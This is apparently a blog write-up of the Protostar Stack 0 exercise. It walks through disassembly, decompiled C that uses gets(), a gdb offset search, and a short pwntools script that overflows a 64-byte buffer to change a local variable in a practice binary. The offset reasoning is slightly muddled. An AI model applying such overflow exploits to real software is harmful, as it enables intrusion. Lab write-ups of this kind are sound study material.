---
layout: post
title: Protostar Stack 0
data: 2025-04-23
categories: [pwn]
---



**GOAL** : Modify a variable



```sh
0x08048405 <+17>:	lea    eax,[esp+0x1c]
0x08048409 <+21>:	mov    DWORD PTR [esp],eax
0x0804840c <+24>:	call   0x804830c <gets@plt>

```

This takes user input and stores it at [esp+0x1c]

```sh
   0x080483fd <+9>:	    mov    DWORD PTR [esp+0x5c],0x0
   0x08048411 <+29>:	mov    eax,DWORD PTR [esp+0x5c]
   0x08048415 <+33>:	test   eax,eax
   0x08048417 <+35>:	je     0x8048427 <main+51>
   0x08048419 <+37>:	mov    DWORD PTR [esp],0x8048500
   0x08048420 <+44>:	call   0x804832c <puts@plt>
   0x08048425 <+49>:	jmp    0x8048433 <main+63>
   0x08048427 <+51>:	mov    DWORD PTR [esp],0x8048529
   0x0804842e <+58>:	call   0x804832c <puts@plt>
   0x08048433 <+63>:	leave
   0x08048434 <+64>:	ret

```

Stores 0 into a variable, then compares the variable to 0;
IF true it prints "Try Again"
If false it prints "You have changed the 'modified variable"

**Ghidra Decompiled code**
```c

void main(void)

{
  char buffer [64];
  int please_change_me;
  
  please_change_me = 0;
  gets(buffer);
  if (please_change_me == 0) {
    puts("Try again?");
  }
  else {
    puts("you have changed the \'modified\' variable");
  }
  return;
}

```


---
## Developing Exploit

1. Find the  Offset (Using gdb)
	- set breakpoints at main function and `ret` instruction 
	- run the program in gdb 
	- Create pattern to fill in buffer 
```sh
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
[+] Saved as '$_gef1'
```

- Continue and fill in the program 
- check if the is a buffer overflow

```sh
gef➤  x/wx $ebp
0x61616174:	Cannot access memory at address 0x61616174

```
- Get the buffer size
```sh
gef➤  pattern search 0x61616174
[+] Searching for '74616161'/'61616174' with period=4
[+] Found at offset 76 (little-endian search) likely

```

Buffer size = 76
Offset = 80 | because we need to override the ebp which takes up 4 bytes


**Exploit**
```python
#!/usr/bin/python3

from pwn import *

binary = "./stack0"
elf = ELF(binary)
p = process(binary)
#goal is to modify varaible
buf_size = 76
offset = 80

payload = b"A"*offset
payload += p32(0x2) # change the varible to 2

p.sendline(payload)
p.interactive()
```
